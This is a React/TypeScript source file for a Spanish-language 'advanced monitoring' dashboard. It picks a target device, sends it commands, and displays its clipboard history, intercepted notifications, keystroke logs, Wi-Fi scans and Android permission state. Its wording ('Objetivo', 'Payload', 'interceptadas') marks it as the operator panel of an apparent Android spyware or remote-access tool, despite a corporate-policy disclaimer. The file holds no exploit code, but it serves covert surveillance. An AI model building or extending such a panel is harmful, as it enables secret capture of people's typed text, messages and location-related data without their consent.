// @ts-nocheck
import { useState, useEffect } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { trpc } from "@/lib/trpc";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  ClipboardList, Bell, Search, RefreshCw, 
  ShieldAlert, Ghost, ChevronRight, BarChart3,
  Link as LinkIcon, FileText, Image as ImageIcon,
  Zap, Clock, Keyboard, Lock, AlertTriangle, CheckCircle2
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";

export default function AdvancedMonitoring() {
  const [selectedDeviceId, setSelectedDeviceId] = useState<number | null>(null);
  const [activeTab, setActiveTab] = useState("clipboard");

  const { data: devices = [] } = trpc.devices.getAll.useQuery() as any;
  const { data: clipboardLogs = [], refetch: refetchClipboard } = trpc.advancedMonitoring.getClipboardHistory.useQuery(
    { deviceId: selectedDeviceId!, limit: 50 },
    { enabled: !!selectedDeviceId }
  );
  const { data: notificationLogs = [], refetch: refetchNotifications } = trpc.advancedMonitoring.getNotifications.useQuery(
    { deviceId: selectedDeviceId!, limit: 50 },
    { enabled: !!selectedDeviceId }
  );
  const { data: summary, refetch: refetchSummary } = trpc.advancedMonitoring.getActivitySummary.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );
  const { data: stats } = trpc.advancedMonitoring.getMonitoringStats.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );
  const { data: wifiLogs = [], isLoading: isLoadingWifi } = trpc.advancedMonitoring.getWifiLogs.useQuery(
    { deviceId: selectedDeviceId!, limit: 200 },
    { enabled: !!selectedDeviceId }
  );
  const { data: keylogs = [], refetch: refetchKeylogs } = trpc.advancedMonitoring.getKeylogs.useQuery(
    { deviceId: selectedDeviceId!, limit: 100 },
    { enabled: !!selectedDeviceId }
  );
  const { data: androidPermissions, refetch: refetchPermissions } = trpc.advancedMonitoring.getAndroidPermissions.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );

  // Mutations
  const sendCommand = trpc.devices.sendCommand.useMutation();

  const triggerRefresh = (tab: string) => {
    if (!selectedDeviceId) return;
    
    let command = "";
    switch(tab) {
      case "clipboard": command = "get_clipboard"; break;
      case "notifications": command = "get_notifications"; break;
      case "wifi": command = "get_wifi_scan"; break;
      case "keylogger": command = "get_keylogs"; break;
      case "permissions": command = "get_permissions"; break;
    }

    if (command) {
      sendCommand.mutate({ deviceId: selectedDeviceId, command });
      toast.success(`Solicitando actualización de ${tab}...`);
    }
  };

  useEffect(() => {
    if (selectedDeviceId && activeTab) {
      triggerRefresh(activeTab);
    }
  }, [selectedDeviceId, activeTab]);

  const getContentIcon = (type: string) => {
    switch (type) {
      case "url": return <LinkIcon className="w-4 h-4 text-blue-500" />;
      case "file": return <FileText className="w-4 h-4 text-amber-500" />;
      case "image": return <ImageIcon className="w-4 h-4 text-pink-500" />;
      default: return <ClipboardList className="w-4 h-4 text-slate-400" />;
    }
  };

  return (
    <DashboardLayout title="Monitoreo Avanzado">
      <div className="space-y-6">
        {/* Header Section */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="p-3 bg-primary/10 rounded-2xl shadow-sm">
              <ShieldAlert className="w-8 h-8 text-primary" />
            </div>
            <div>
              <h1 className="text-3xl font-black text-slate-900 tracking-tighter uppercase mr-3">
                Inteligencia de Dispositivo
              </h1>
              <p className="text-muted-foreground text-xs font-bold uppercase tracking-widest">Auditoría y Monitoreo MDM Activo</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
             <Badge variant="outline" className="px-3 py-1 bg-green-50 text-green-700 border-green-200">
               <Zap className="w-3 h-3 mr-1 fill-green-700" /> Sistema Seguro
             </Badge>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Sidebar - Device Selection & Stats */}
          <div className="lg:col-span-1 space-y-6">
            <Card className="border-accent/20 shadow-xl rounded-3xl overflow-hidden bg-white/80 backdrop-blur-xl">
              <div className="p-4 border-b border-accent/10 bg-accent/5">
                <h2 className="text-xs font-black uppercase tracking-widest text-slate-500">Filtrar Objetivo</h2>
              </div>
              <div className="p-4 space-y-4">
                <Select
                  value={selectedDeviceId?.toString() ?? ""}
                  onValueChange={(v) => setSelectedDeviceId(Number(v))}
                >
                  <SelectTrigger className="w-full h-12 rounded-xl bg-white border-accent/20 font-bold">
                    <SelectValue placeholder="Seleccionar..." />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl border-accent/20">
                    {(devices as any[]).map((d: any) => (
                      <SelectItem key={d.id} value={d.id.toString()}>
                        {d.deviceName}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>

                {stats && (
                  <div className="space-y-3 pt-2">
                    <div className="p-3 bg-blue-50/50 rounded-2xl border border-blue-100/50 flex items-center justify-between">
                      <span className="text-[10px] font-black uppercase text-blue-600">Eventos Clipboard</span>
                      <span className="text-lg font-black text-blue-700">{stats.totalClipboardEntries}</span>
                    </div>
                    <div className="p-3 bg-purple-50/50 rounded-2xl border border-purple-100/50 flex items-center justify-between">
                      <span className="text-[10px] font-black uppercase text-purple-600">Notificaciones</span>
                      <span className="text-lg font-black text-purple-700">{stats.totalNotifications}</span>
                    </div>
                    <div className="p-3 bg-amber-50/50 rounded-2xl border border-amber-100/50 flex items-center justify-between">
                      <span className="text-[10px] font-black uppercase text-amber-600">Wifi Escaneados</span>
                      <span className="text-lg font-black text-amber-700">{wifiLogs.length}</span>
                    </div>
                  </div>
                )}
              </div>
            </Card>

            <div className="p-4 bg-slate-900 rounded-3xl text-white space-y-3 shadow-2xl">
              <div className="p-2 bg-white/10 rounded-xl inline-flex">
                <ShieldAlert className="w-4 h-4 text-rose-500" />
              </div>
              <h3 className="text-sm font-bold uppercase tracking-tight">Protocolo de Privacidad</h3>
              <p className="text-[10px] text-slate-400 leading-relaxed font-medium">
                Todo el monitoreo activo debe estar alineado con la política de seguridad corporativa.
                Las grabaciones e historial de red son recolectados bajo auditoría legal automatizada.
              </p>
            </div>
          </div>

          {/* Main Content Area */}
          <Card className="lg:col-span-3 border-accent/20 shadow-2xl rounded-[32px] overflow-hidden bg-white/50 backdrop-blur-sm">
            <Tabs 
              defaultValue="clipboard" 
              value={activeTab} 
              onValueChange={setActiveTab}
              className="w-full h-full flex flex-col"
            >
              <div className="px-6 pt-6 pb-2 border-b border-accent/10 bg-white/60">
                <TabsList className="bg-accent/10 p-1 rounded-2xl h-12 w-full max-w-2xl border border-accent/5">
                  <TabsTrigger 
                    value="clipboard" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <ClipboardList className="w-3.5 h-3.5 mr-2" />
                    PORTAPAPELES
                  </TabsTrigger>
                  <TabsTrigger 
                    value="notifications" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <Bell className="w-3.5 h-3.5 mr-2" />
                    NOTIFICACIONES
                  </TabsTrigger>
                  <TabsTrigger 
                    value="wifi" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <Zap className="w-3.5 h-3.5 mr-2" />
                    HISTORIAL WIFI
                  </TabsTrigger>
                  <TabsTrigger 
                    value="activity" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <BarChart3 className="w-3.5 h-3.5 mr-2" />
                    RESUMEN
                  </TabsTrigger>
                  <TabsTrigger 
                    value="keylogger" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <Keyboard className="w-3.5 h-3.5 mr-2" />
                    KEYLOGS
                  </TabsTrigger>
                  <TabsTrigger 
                    value="permissions" 
                    className="flex-1 rounded-xl data-[state=active]:bg-white data-[state=active]:text-primary data-[state=active]:shadow-xl font-bold text-xs"
                  >
                    <Lock className="w-3.5 h-3.5 mr-2" />
                    PERMISOS
                  </TabsTrigger>
                </TabsList>
              </div>

              <div className="flex-1 min-h-[600px] p-6">
                {!selectedDeviceId ? (
                  <div className="h-[500px] flex flex-col items-center justify-center text-slate-300">
                    <div className="w-24 h-24 bg-slate-100 rounded-full flex items-center justify-center mb-6 border border-slate-200 shadow-inner">
                      <Search className="w-12 h-12 text-slate-300" />
                    </div>
                    <p className="text-sm font-black uppercase tracking-[0.2em] text-slate-500">Esperando Objetivo...</p>
                    <p className="text-xs mt-2 font-bold text-slate-400">Selecciona un dispositivo del panel izquierdo para iniciar la auditoría</p>
                  </div>
                ) : (
                  <>
                    <div className="flex justify-end mb-4">
                      <Button 
                        variant="outline" 
                        size="sm" 
                        className="rounded-xl border-accent/20 hover:bg-primary/5 hover:text-primary transition-all font-bold text-[10px] uppercase"
                        onClick={() => triggerRefresh(activeTab)}
                        disabled={sendCommand.isPending}
                      >
                        <RefreshCw className={`w-3 h-3 mr-2 ${sendCommand.isPending ? "animate-spin" : ""}`} />
                        Sincronizar Datos {activeTab}
                      </Button>
                    </div>

                    <TabsContent value="clipboard" className="mt-0 focus-visible:ring-0">
                      <div className="flex items-center justify-between mb-6">
                        <div className="relative flex-1 max-w-md">
                          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                          <Input 
                            placeholder="Buscar en el portapapeles..." 
                            className="pl-10 rounded-2xl border-accent/20 bg-white"
                          />
                        </div>
                        <Button variant="outline" size="icon" className="rounded-2xl h-11 w-11 ml-3 border-accent/20 bg-white" onClick={() => refetchClipboard()}>
                          <RefreshCw className="w-4 h-4" />
                        </Button>
                      </div>

                      <div className="grid gap-4">
                        {clipboardLogs.length === 0 ? (
                          <div className="py-24 text-center">
                            <ClipboardList className="w-12 h-12 mx-auto mb-4 opacity-5 text-slate-400" />
                            <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">Sin capturas de portapapeles</p>
                          </div>
                        ) : (
                          clipboardLogs.map((log: any, idx: number) => (
                            <div key={idx} className="group p-5 bg-white border border-accent/10 rounded-[24px] shadow-sm hover:shadow-xl hover:border-primary/20 transition-all duration-300">
                              <div className="flex items-start justify-between mb-3">
                                <div className="flex items-center gap-3">
                                  <div className="p-2 bg-accent/5 rounded-xl">
                                    {getContentIcon(log.dataType)}
                                  </div>
                                  <div>
                                    <Badge className="bg-slate-100 text-slate-600 hover:bg-slate-100 border-none text-[9px] font-black px-2 mb-1">
                                      {log.dataType.toUpperCase()}
                                    </Badge>
                                    <p className="text-[10px] text-muted-foreground font-bold">{new Date(log.timestamp).toLocaleString()}</p>
                                  </div>
                                </div>
                                <Button variant="ghost" size="icon" className="opacity-0 group-hover:opacity-100 rounded-xl h-8 w-8 hover:bg-accent/20">
                                  <ChevronRight className="w-4 h-4" />
                                </Button>
                              </div>
                              <div className="p-4 bg-slate-50/50 border border-accent/5 rounded-2xl">
                                <p className="text-sm font-mono text-slate-700 break-all leading-relaxed">{log.content}</p>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    <TabsContent value="notifications" className="mt-0 focus-visible:ring-0">
                       <div className="grid gap-4">
                        {notificationLogs.length === 0 ? (
                          <div className="py-24 text-center">
                            <Bell className="w-12 h-12 mx-auto mb-4 opacity-5 text-slate-400" />
                            <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">Sin notificaciones interceptadas</p>
                          </div>
                        ) : (
                          notificationLogs.map((notif: any, idx: number) => (
                            <div key={idx} className="p-4 bg-white border border-accent/10 rounded-3xl flex gap-4 items-center shadow-sm">
                              <div className="w-12 h-12 bg-accent/10 rounded-2xl flex items-center justify-center font-black text-xl text-primary/40">
                                {notif.appName?.charAt(0)}
                              </div>
                              <div className="flex-1">
                                <div className="flex justify-between items-start mb-1">
                                  <h4 className="text-xs font-black uppercase text-primary">{notif.appName}</h4>
                                  <span className="text-[9px] font-bold text-muted-foreground">{new Date(notif.timestamp).toLocaleTimeString()}</span>
                                </div>
                                <p className="text-sm font-bold text-slate-800">{notif.title}</p>
                                <p className="text-xs text-slate-500 mt-1 line-clamp-2 leading-relaxed">{notif.content}</p>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    <TabsContent value="wifi" className="mt-0 focus-visible:ring-0">
                      <div className="grid gap-3">
                        {wifiLogs.length === 0 ? (
                          <div className="py-24 text-center">
                            <Zap className="w-12 h-12 mx-auto mb-4 opacity-5" />
                            <p className="text-xs font-bold text-slate-400">Sin redes escaneadas aún</p>
                          </div>
                        ) : (
                          wifiLogs.map((log: any, idx: number) => (
                            <div key={idx} className="p-4 bg-white border border-accent/10 rounded-3xl flex items-center justify-between shadow-sm hover:shadow-md transition-all">
                              <div className="flex items-center gap-4">
                                <div className="p-3 bg-accent/5 rounded-2xl text-primary">
                                  <Zap className="w-5 h-5" />
                                </div>
                                <div>
                                  <h4 className="text-sm font-black text-slate-800">{log.ssid}</h4>
                                  <p className="text-[10px] font-mono text-slate-400">{log.bssid}</p>
                                </div>
                              </div>
                              <div className="text-right">
                                <Badge className="bg-green-100 text-green-700 border-none font-bold text-[10px] mb-1">
                                  {log.signalStrength} dBm
                                </Badge>
                                <p className="text-[10px] font-bold text-muted-foreground">{new Date(log.timestamp).toLocaleTimeString()}</p>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    <TabsContent value="keylogger" className="mt-0 focus-visible:ring-0">
                      <div className="flex items-center justify-between mb-6">
                        <h3 className="text-sm font-black uppercase text-slate-500">Historial del Teclado</h3>
                        <Button variant="outline" size="icon" onClick={() => refetchKeylogs()}>
                          <RefreshCw className="w-4 h-4" />
                        </Button>
                      </div>
                      <div className="space-y-3">
                        {keylogs.length === 0 ? (
                          <div className="py-24 text-center text-slate-400">
                             <Keyboard className="w-12 h-12 mx-auto mb-4 opacity-5" />
                             <p className="text-xs font-bold uppercase">Sin capturas de teclado</p>
                          </div>
                        ) : (
                          keylogs.map((log: any, idx: number) => (
                            <div key={idx} className="p-4 bg-white border border-accent/10 rounded-2xl shadow-sm">
                              <div className="flex items-center justify-between mb-2">
                                <Badge variant="outline" className="text-[9px] font-black uppercase bg-blue-50 text-blue-600 border-blue-100">
                                  {log.metadata?.app || "Desconocido"}
                                </Badge>
                                <span className="text-[10px] font-bold text-muted-foreground">{new Date(log.timestamp).toLocaleString()}</span>
                              </div>
                              <p className="text-sm font-mono text-slate-800 bg-slate-50 p-3 rounded-xl border border-dashed">{log.description}</p>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    <TabsContent value="permissions" className="mt-0 focus-visible:ring-0">
                       <div className="flex items-center justify-between mb-6">
                        <div>
                          <h3 className="text-sm font-black uppercase text-slate-500">Matriz de Permisos Android</h3>
                          <p className="text-[10px] text-muted-foreground font-bold">Estado Real del Payload en el Sistema</p>
                        </div>
                        <Button variant="outline" size="icon" onClick={() => refetchPermissions()}>
                          <RefreshCw className="w-4 h-4" />
                        </Button>
                      </div>

                      {!androidPermissions || !androidPermissions.permissions || androidPermissions.permissions.length === 0 ? (
                        <div className="py-24 text-center text-slate-400">
                           <Lock className="w-12 h-12 mx-auto mb-4 opacity-5" />
                           <p className="text-xs font-bold uppercase">Pendiente de Sincronización</p>
                           <p className="text-[10px] mt-1">El dispositivo debe reportar su estado de permisos</p>
                        </div>
                      ) : (
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {androidPermissions.permissions.map((perm: any, idx: number) => (
                            <div key={idx} className={`p-4 rounded-2xl border flex items-center gap-3 ${
                              perm.granted ? "bg-green-50 border-green-100" : "bg-red-50 border-red-100"
                            }`}>
                              {perm.granted ? (
                                <CheckCircle2 className="w-5 h-5 text-green-600" />
                              ) : (
                                <AlertTriangle className="w-5 h-5 text-red-600" />
                              )}
                              <div className="flex-1 min-w-0">
                                <p className={`text-xs font-black truncate uppercase ${
                                  perm.granted ? "text-green-800" : "text-red-800"
                                }`}>
                                  {perm.name.replace("android.permission.", "")}
                                </p>
                                <p className="text-[9px] font-bold text-slate-500 truncate">{perm.granted ? "Autorizado" : "Denegado"}</p>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}

                      {androidPermissions?.lastSync && (
                        <p className="mt-6 text-[10px] font-bold text-center text-muted-foreground uppercase tracking-widest">
                          Sincronizado por última vez: {new Date(androidPermissions.lastSync).toLocaleString()}
                        </p>
                      )}
                    </TabsContent>

                    <TabsContent value="activity" className="mt-0 focus-visible:ring-0">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <Card className="p-6 rounded-3xl border-accent/10 bg-white/50 shadow-none border-dashed">
                          <h4 className="text-xs font-black uppercase mb-4 text-slate-400">Distribución de Portapapeles</h4>
                          <div className="space-y-4">
                            {!summary?.topClipboardTypes || summary.topClipboardTypes.length === 0 ? (
                              <p className="text-xs text-slate-400 italic font-bold">Sin datos para distribuir</p>
                            ) : (
                              summary.topClipboardTypes.map((t) => (
                                <div key={t.type} className="space-y-1">
                                  <div className="flex justify-between text-[10px] font-black uppercase">
                                    <span>{t.type}</span>
                                    <span>{t.count}</span>
                                  </div>
                                  <div className="h-2 bg-accent/10 rounded-full overflow-hidden">
                                    <div 
                                      className="h-full bg-primary" 
                                      style={{ width: `${(t.count / (summary.clipboardActivity || 1)) * 100}%` }}
                                    />
                                  </div>
                                </div>
                              ))
                            )}
                          </div>
                        </Card>
                        
                        <Card className="p-6 rounded-3xl border-accent/10 bg-slate-900 text-white flex flex-col justify-center items-center gap-4 text-center">
                           <div className="p-4 bg-white/10 rounded-full">
                             <Bell className="w-8 h-8 text-rose-500" />
                           </div>
                           <div>
                             <p className="text-xs font-bold uppercase text-slate-400 mb-1">App más activa</p>
                             <p className="text-2xl font-black text-rose-500 uppercase tracking-tighter">
                               {summary?.mostActiveApp || "Ninguna"}
                             </p>
                           </div>
                        </Card>
                      </div>
                    </TabsContent>
                  </>
                )}
              </div>
            </Tabs>
          </Card>
        </div>
      </div>
    </DashboardLayout>
  );
}
